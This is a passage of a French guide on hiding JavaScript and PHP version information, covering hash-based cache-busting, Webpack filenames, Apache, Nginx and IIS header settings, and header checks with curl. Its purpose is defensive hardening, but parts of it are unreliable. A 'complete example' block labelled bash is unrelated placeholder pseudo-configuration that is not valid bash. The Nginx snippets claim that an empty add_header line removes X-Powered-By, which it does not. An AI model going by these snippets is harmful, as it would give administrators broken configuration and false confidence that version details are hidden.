<li>Si les versions ne sont pas dans les paramètres, il essaie de les trouver dans le nom de fichier.</li>
<li>En dernier recours, il effectue une requête HTTP pour récupérer la version à partir des en-têtes de réponse ou du contenu du fichier JS.</li>
</ul>
</li>
</ol>


## Conclusion : Extraction et gestion de versions d'URLs JS

| Tags |
|------|
| `Python` `HAR` `JS` `URLs` `Extraction` |

Ce script Python offre une solution pour l'extraction des URLs de fichiers JavaScript à partir d'un fichier HAR, ainsi que pour la gestion de leurs versions. L'implémentation de l'extraction de versions peut être personnalisée pour correspondre à la structure spécifique des URLs et des fichiers JS analysés.


## Obfuscation des versions JavaScript

| Tags |
|------|
| `JavaScript` `Sécurité` `Obfuscation` |

L'obfuscation des versions des fichiers JavaScript vise à dissimuler les informations de version des bibliothèques et scripts utilisés. Cette pratique contribue à la sécurité en compliquant l'identification des vulnérabilités potentielles pour les attaquants. Voici quelques stratégies possibles :


## Noms de fichiers sans numéros de version

| Tags |
|------|
| `fichiers` `cache` `URL` |

Au lieu d'intégrer les numéros de version dans les noms de fichiers, utilisez des noms génériques. La gestion du cache est assurée en ajoutant un paramètre de cache-busting à l'URL du fichier.


## Mise à jour des scripts JavaScript

| Tags |
|------|
| `JavaScript` `HTML` `Versionning` |

Avant :

```html
<script src="https://example.com/js/script-1.2.3.js"></script>
```

Après :

```html
<script src="https://example.com/js/script.js?v=123456"></script>
```


## Utilisation de hashs pour le cache-busting

| Tags |
|------|
| `cache` `hash` `performance` |

Générer un hash du contenu du fichier et l'utiliser comme paramètre de cache-busting. Ce paramètre est mis à jour chaque fois que le fichier est modifié.


## Génération de Hash MD5 avec Python

| Tags |
|------|
| `Python` `Hash` `MD5` `Scripting` |

```python
import hashlib

def generate_hash(file_path):
    with open(file_path, 'rb') as f:
        file_content = f.read()
        return hashlib.md5(file_content).hexdigest()

# Usage
file_path = 'path/to/your/script.js'
hash_value = generate_hash(file_path)
print(f'https://example.com/js/script.js?v={hash_value}')
```


## Intégration WordPress : Scripts avec cache-busting

| Tags |
|------|
| `WordPress` `PHP` `cache-busting` `wp_enqueue_scripts` |

```php
function generate_hash($file_path) {
    return hash_file('md5', $file_path);
}

function my_enqueue_scripts() {
    $template_directory = get_template_directory_uri();
    $theme_directory = get_template_directory();

    // Chemins des fichiers JS
    $script1_path = $theme_directory . '/js/script1.js';
    $script2_path = $theme_directory . '/js/script2.js';

    // Générer des hashes
    $script1_hash = generate_hash($script1_path);
    $script2_hash = generate_hash($script2_path);

    // Enregistrer les scripts avec les hashes comme paramètres de cache-busting
    wp_enqueue_script('script1-handle', $template_directory . '/js/script1.js?v=' . $script1_hash, array(), null, true);
    wp_enqueue_script('script2-handle', $template_directory . '/js/script2.js?v=' . $script2_hash, array(), null, true);
}
add_action('wp_enqueue_scripts', 'my_enqueue_scripts');
```


## Minimiser les informations de version HTTP

| Tags |
|------|
| `HTTP` `Sécurité` `En-têtes` |

Assurez-vous que votre serveur ne divulgue pas les versions des bibliothèques ou des applications dans les en-têtes de réponse HTTP. Cela inclut les en-têtes tels que <code>X-Powered-By</code>, <code>Server</code>, et tout autre en-tête personnalisé.


## Configuration Apache Exemple

| Tags |
|------|
| `Apache` `Sécurité` `Configuration` |

```apache
# Masquer les informations de version d'Apache
ServerSignature Off
ServerTokens Prod

# Supprimer les en-têtes X-Powered-By
<IfModule mod_headers.c>
    Header unset X-Powered-By
</IfModule>
```


## Configuration Nginx

| Tags |
|------|
| `Nginx` `configuration` `sécurité` |

```nginx
# Masquer les informations de version de Nginx
server_tokens off;

# Supprimer les en-têtes X-Powered-By
add_header X-Powered-By "";
```


## Utilisation d'un CDN

| Tags |
|------|
| `CDN` `JavaScript` `Cache` |

Les Content Delivery Networks (CDNs) permettent de diffuser les fichiers JavaScript sans révéler les versions. Il est possible de configurer le CDN pour gérer le cache-busting en utilisant des URL versionnées ou des hachages.


## Renommage automatisé des fichiers après mise à jour

| Tags |
|------|
| `scripts` `automatisation` `sécurité` |


## Automatisation de la construction (build)

| Tags |
|------|
| `Webpack` `Gulp` `Grunt` `automatisation` `build` |

Utilisez des outils comme Webpack, Gulp ou Grunt pour automatiser le processus de build et de renommage des fichiers.


## Configuration Webpack : Exemple

| Tags |
|------|
| `Webpack` `JavaScript` `Configuration` `Babel` |

```javascript
const path = require('path');
const { CleanWebpackPlugin } = require('clean-webpack-plugin');

module.exports = {
    entry: './src/index.js',
    output: {
        filename: 'script.[contenthash].js',
        path: path.resolve(__dirname, 'dist'),
    },
    plugins: [
        new CleanWebpackPlugin(),
    ],
    module: {
        rules: [
            {
                test: /\.js$/,
                exclude: /node_modules/,
                use: {
                    loader: 'babel-loader',
                },
            },
        ],
    },
};
```


## Obfuscation des versions JavaScript

| Tags |
|------|
| `JavaScript` `Sécurité` `Obfuscation` `Cache-busting` |

L'obfuscation des versions des fichiers JavaScript peut être réalisée grâce à diverses techniques, notamment :

*   **Cache-busting**
*   **Suppression des en-têtes HTTP révélateurs**
*   **Utilisation de CDN (Content Delivery Network)**
*   **Renommage des fichiers**

Ces stratégies visent à minimiser la surface d'attaque en dissimulant les informations de version qui pourraient être exploitées par des attaquants.


## Masquer la version de PHP pour le pentest

| Tags |
|------|
| `PHP` `Sécurité` `Obfuscation` `Serveur Web` |

Obfusquer la version de PHP sur un serveur web est une mesure de sécurité préventive, rendant plus difficile l'exploitation de vulnérabilités spécifiques. Les instructions suivantes détaillent comment masquer la version de PHP dans différents environnements de serveur web.


## Sécurisation d'Apache

| Tags |
|------|
| `Apache` `php.ini` `Sécurité` `httpd.conf` |

<ol>
<li>
<p><strong>Modifier le fichier <code>php.ini</code></strong> :</p>
<ul>
<li>Ouvrez le fichier <code>php.ini</code> et recherchez la directive <code>expose_php</code>.</li>
<li>
Désactivez l'exposition de la version PHP :
<pre><code class="language-ini">expose_php = Off
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Masquer les informations de version dans les en-têtes HTTP</strong> :</p>
<ul>
<li>Modifiez le fichier de configuration Apache (<code>httpd.conf</code> ou un fichier de configuration de votre site dans <code>sites-available</code>).</li>
<li>
Ajoutez ou modifiez les lignes suivantes pour désactiver les signatures de serveur et les tokens :
<pre><code class="language-apache">ServerSignature Off
ServerTokens Prod
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Redémarrer Apache</strong> :</p>
<pre><code class="language-bash">sudo systemctl restart apache2
</code></pre>
</li>
</ol>


## Sécurisation de Nginx

| Tags |
|------|
| `Nginx` `php.ini` `Sécurité` `Configuration` |

<ol>
<li>
<p><strong>Modifier le fichier <code>php.ini</code></strong> :</p>
<ul>
<li>Ouvrez le fichier <code>php.ini</code> et recherchez la directive <code>expose_php</code>.</li>
<li>
Désactivez l'exposition de la version PHP :
<pre><code class="language-ini">expose_php = Off
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Masquer les informations de version dans les en-têtes HTTP</strong> :</p>
<ul>
<li>Modifiez le fichier de configuration Nginx (<code>nginx.conf</code> ou un fichier de configuration de votre site dans <code>sites-available</code>).</li>
<li>
Ajoutez ou modifiez les lignes suivantes pour désactiver les signatures de serveur :
<pre><code class="language-nginx">server_tokens off;

location ~ \.php$ {
    add_header X-Powered-By &quot;My Custom PHP Header&quot; always;
}
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Redémarrer Nginx</strong> :</p>
<pre><code class="language-bash">sudo systemctl restart nginx
</code></pre>
</li>
</ol>


## Sécuriser IIS : Masquer les informations PHP

| Tags |
|------|
| `IIS` `PHP` `Sécurité` `php.ini` `HTTP` |

<ol>
<li>
<p><strong>Modifier le fichier <code>php.ini</code></strong> :</p>
<ul>
<li>Ouvrez le fichier <code>php.ini</code> et recherchez la directive <code>expose_php</code>.</li>
<li>
Désactivez l'exposition de la version PHP :
<pre><code class="language-ini">expose_php = Off
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Masquer les informations de version dans les en-têtes HTTP</strong> :</p>
<ul>
<li>Ouvrez le gestionnaire des services IIS.</li>
<li>Sélectionnez votre site ou serveur et double-cliquez sur &quot;En-têtes de réponse HTTP&quot;.</li>
<li>
Ajoutez une en-tête personnalisée :
<ul>
<li>Nom : <code>X-Powered-By</code></li>
<li>Valeur : <code>My Custom PHP Header</code></li>
</ul>
</li>
<li>Supprimez les en-têtes existants qui peuvent révéler des informations de version.</li>
</ul>
</li>
<li>
<p><strong>Redémarrer IIS</strong> :</p>
<pre><code class="language-bash">iisreset
</code></pre>
</li>
</ol>


## Vérification des modifications de configuration

| Tags |
|------|
| `curl` `HTTP` `Sécurité` `PHP` |

<ol>
<li>
<p><strong>Vérification des en-têtes HTTP avec <code>curl</code></strong> :</p>
<ul>
<li>
<p>Après application des modifications, utilisez <code>curl</code> pour confirmer la non-exposition des informations de version PHP :</p>
<pre><code class="language-bash">curl -I http://[NOM].com
</code></pre>
</li>
<li>
<p>Les en-têtes de réponse ne doivent plus contenir <code>X-Powered-By: PHP/x.y.z</code>.</p>
</li>
</ul>
</li>
<li>
<p><strong>Utilisation d'outils en ligne</strong> :</p>
<ul>
<li>Utilisez des outils comme <a href="https://securityheaders.io/">SecurityHeaders.io</a> pour analyser les en-têtes HTTP de votre site web et vérifier l'absence d'informations sensibles.</li>
</ul>
</li>
</ol>


## Configuration Complète Exemple

| Tags |
|------|
| `configuration` `exemple` `code` |

```bash
# Exemple de configuration pour [NOM]
# Cette configuration est fournie à titre d'exemple et peut nécessiter des ajustements

# Configuration du réseau
interface eth0 {
    ip address [IP] netmask 255.255.255.0
    # Configuration du DNS
    name-server 8.8.8.8
    name-server 8.8.4.4
}

# Configuration du service [SERVICE]
service [SERVICE] {
    # Port d'écoute
    port 8080
    # Utilisateur et groupe d'exécution
    user [NOM]
    group [NOM]
    # Chemin vers les fichiers de logs
    log-file /var/log/[SERVICE].log
    # Autres options spécifiques au service
    option1 value1
    option2 value2
}

# Configuration de la sécurité
firewall {
    # Autoriser le trafic entrant sur le port 22 (SSH)
    allow in tcp from any to any port 22
    # Bloquer tout autre trafic entrant par défaut
    default deny
}

# Configuration des alertes
alerts {
    # Envoyer des alertes par email
    email {
        from [EMAIL]
        to [EMAIL]
        server smtp.example.com
    }
}
```

## Sécurisation Apache

| Tags |
|------|
| `Apache` `php.ini` `httpd.conf` `Sécurité` |

<p><code>php.ini</code> :</p>
<pre><code class="language-ini">expose_php = Off
</code></pre>
<p><code>httpd.conf</code> ou fichier de site dans <code>sites-available</code> :</p>
<pre><code class="language-apache">ServerSignature Off
ServerTokens Prod
</code></pre>


## Configuration Nginx

| Tags |
|------|
| `Nginx` `PHP` `Sécurité` |

```ini
php.ini
expose_php = Off
```

```nginx
nginx.conf ou fichier de site dans sites-available
server_tokens off;

location ~ \.php$ {
    add_header X-Powered-By &quot;My Custom PHP Header&quot; always;
}
```


## Obfusquer la version de PHP

| Tags |
|------|
| `PHP` `Sécurité` `Serveur web` |

En suivant ces étapes, vous pouvez efficacement obfusquer la version de PHP sur votre serveur, réduisant ainsi les informations disponibles pour les attaquants potentiels. C'est une mesure simple mais efficace pour améliorer la sécurité de votre serveur web.
